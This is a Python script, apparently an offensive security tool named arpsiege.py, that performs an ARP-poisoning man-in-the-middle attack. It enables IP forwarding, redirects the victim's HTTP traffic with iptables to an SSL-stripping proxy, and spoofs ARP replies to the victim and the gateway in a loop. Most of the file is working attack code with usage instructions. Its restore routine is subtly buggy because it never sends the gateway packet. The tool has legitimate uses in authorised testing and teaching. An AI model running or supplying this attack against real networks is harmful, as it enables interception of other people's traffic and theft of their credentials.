"""------------------------------------------------------------------------'''
''' File: arpsiege.py
''' Author: s0lst1c3
''' Description: Conducts a MITM attack by configuring OS to behave as a
'''              router, configuring iptables to forward http traffic to a
'''              stripping stripping proxy such as SSLStrip, and arp poisoning
'''              both the victim and default gateway. Can also restore victim
'''              and gateway to previous state to clean up after successful
'''              attack.
''' Usage:
'''
'''     # arp poisoning attack
'''     python arpsiege.py -i <interface> -t <target> -g <gateway>
'''
'''     # restore victim and gateway
'''     python arpsiege.py -i <interface> -t <target> -g <gateway> --antidote
'''
'''-------------------------------------------------------------------------"""


from __future__ import print_function

import subprocess

from scapy.all import *
from argparse import ArgumentParser

IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
HTTP_PORT  = 80
PROXY_PORT = 8080

RETRY      = 10
TIMEOUT    = 2

BADNESS = """
         ___      .______      .______     _______. __   _______   _______  _______ 
        /   \     |   _  \     |   _  \   /       ||  | |   ____| /  _____||   ____|
       /  ^  \    |  |_)  |    |  |_)  | |   (----`|  | |  |__   |  |  __  |  |__   
      /  /_\  \   |      /     |   ___/   \   \    |  | |   __|  |  | |_ | |   __|  
     /  _____  \  |  |\  \----.|  |   .----)   |   |  | |  |____ |  |__| | |  |____ 
    /__/     \__\ | _| `._____|| _|   |_______/    |__| |_______| \______| |_______|
                                                                                    
"""

def enable_packet_forwarding():

    print('[*] Enabling packet forwarding.')

    with open(IP_FORWARD, 'w') as ip_forward:
        ip_forward.write('1')

def disable_packet_forwarding():

    print('[*] Disabling packet forwarding.')

    with open(IP_FORWARD, 'w') as ip_forward:
        ip_forward.write('0')

def enable_http_redirection(configs):

    print('[*] Redirecting http traffic to port %d' % (configs['proxy_port']))

    battle_kommand([ 'iptables', '-v',
        '-t', 'nat',
        '-A', 'PREROUTING',
        '-p', 'tcp',
        '--destination-port', '%d' % (HTTP_PORT),
        '-j', 'REDIRECT',
        '--to-port', '%d' % (configs['proxy_port'])])

def disable_http_redirection():

    print('[*] Disabling http redirection.')

    battle_kommand(['iptables', '-v', '--flush'])
    battle_kommand(['iptables', '-v', '--table', 'nat', '--flush'])
    battle_kommand(['iptables', '-v', '--delete-chain'])
    battle_kommand(['iptables', '-v', '--table', 'nat', '--delete-chain'])

def battle_kommand(commands=[]):

    p = subprocess.Popen(commands, stdout=subprocess.PIPE)
    output, err = p.communicate()

    if output != '':
        print('[s]', commands[0])
        for line in output.split('\n'):
            if line != '':
                print('    |\n    -->', line)

def restore_victim(configs):

    print('[*] Cleaning up your mess...')
    
    # create a layer 3 Arp() packet to restore victim
    victim_arp = ARP()

    # set both source mac and source ip to the gateway
    victim_arp.hwsrc = configs['gateway']['mac']
    victim_arp.psrc = configs['gateway']['ip']

    # broadcast 'is-at' reply with correct gateway ip and mac
    victim_arp.op = 2
    victim_arp.hwdst='ff:ff:ff:ff:ff:ff'
    send(victim_arp)

    # create a layer 3 Arp() packet to restore gateway
    gateway_arp = ARP()

    # set both source and mac address to the victim
    gateway_arp.hwsrc = configs['victim']['mac']
    gateway_arp.psrc = configs['victim']['ip']

    # broadcast 'is-at' reply with correct victim ip and mac
    victim_arp.op = 2
    victim_arp.hwdst='ff:ff:ff:ff:ff:ff'
    send(victim_arp)

def poison_victim(configs):
    
    # create a layer 3 Arp() packet to poison the 
    victim_arp = ARP()
    gateway_arp = ARP()

    # set Operation to 'is-at'
    victim_arp.op = 2
    gateway_arp.op = 2

    # set hwdst
    victim_arp.hwdst = configs['victim']['mac']
    gateway_arp.hwdst = configs['gateway']['mac']

    # set pdst
    victim_arp.pdst = configs['victim']['ip']
    gateway_arp.pdst = configs['gateway']['ip']
    

    # set psrc
    victim_arp.psrc = configs['gateway']['ip']
    gateway_arp.psrc = configs['victim']['ip']

    while True:

        try:

            print('[*] Poisoning victim.')
            # send arp replies
            send(victim_arp)
            send(gateway_arp)
                
            # wait for ARP replies from the default GW
            sniff(filter='arp and host %s or %s' %\
                (configs['gateway']['ip'], configs['victim']['ip']), count=1)

            print('[*] ARP reply detected from gateway... repoisoning victim.')

        except KeyboardInterrupt:
            break
            
    print('[*] All done!')

def ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT):
    
    # create a layer 3 Arp() packet
    arp = ARP()

    # set Operation to 'who-has'
    arp.op = 1

    # set hwdst to broadcast
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'

    # set pdst ip
    arp.pdst = ip

    # send the arp packet using the layer 3 sr() function
    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    # get the response from the first packet received by accessing
    # layer 2 header
    for s, r in response:
        return r[ARP].underlayer.src
        
    # return failure
    return None

def set_configs():

    parser = ArgumentParser()

    parser.add_argument('-t',
                    dest='victim',
                    required=True,
                    type=str,
                    metavar='<victim>',
                    help='The victim\'s ip address.')

    parser.add_argument('-g',
                    dest='gateway',
                    required=True,
                    type=str,
                    metavar='<gateway>',
                    help='The current gateway\'s ip address.')

    parser.add_argument('-i',
                    dest='interface',
                    required=True,
                    type=str,
                    metavar='<nic>',
                    help='The name of your network inferace.')

    parser.add_argument('-p',
                    dest='proxy_port',
                    required=False,
                    type=int,
                    default=8080,
                    metavar='<port>',
                    help='Redirect all http traffic to this port.')

    parser.add_argument('--antidote',
                    dest='antidote',
                    action='store_true',
                    default=False,
                    help='Restore victims to their original state.')

    args = parser.parse_args()

    return {
        'victim' : {
            'ip' : args.victim,
            'mac' : ip_to_mac(args.victim),
        },
        
        'gateway' : {
            'ip' : args.gateway,
            'mac' : ip_to_mac(args.gateway),
        },
        'interface' : args.interface,
        'proxy_port' : args.proxy_port,
        'antidote' : args.antidote,
    }

def setup_scapy(configs):

    print('[*] Using interface', configs['interface'])
    conf.iface = configs['interface']
    conf.verb = 0

def poison(configs):

    enable_packet_forwarding()

    enable_http_redirection(configs)
    
    poison_victim(configs)

def antidote(configs):

    restore_victim(configs)

    disable_http_redirection()

    disable_packet_forwarding()

def main():

    print(BADNESS)
    
    configs = set_configs()

    setup_scapy(configs)

    if configs['antidote']:
        antidote(configs)
    else:
        poison(configs)

if __name__ == '__main__':
    main()
